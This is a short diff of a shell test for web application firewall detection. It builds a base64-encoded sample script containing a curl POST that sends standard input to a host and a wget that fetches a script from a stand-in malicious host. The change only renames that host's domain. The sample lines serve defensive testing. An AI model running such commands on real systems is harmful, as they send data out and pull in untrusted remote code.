@@ -36,7 +36,7 @@ test_base64_waf_trigger() {
     log "Testing WAF trigger content (shell script with curl/wget)..."
     local test_content='#!/bin/bash
 curl -X POST https://example.com --data-binary @-
-wget https://malicious.site/script.sh'
+wget https://malicious.example/script.sh'
     local encoded
     encoded=$(echo -n "$test_content" | base64)
     
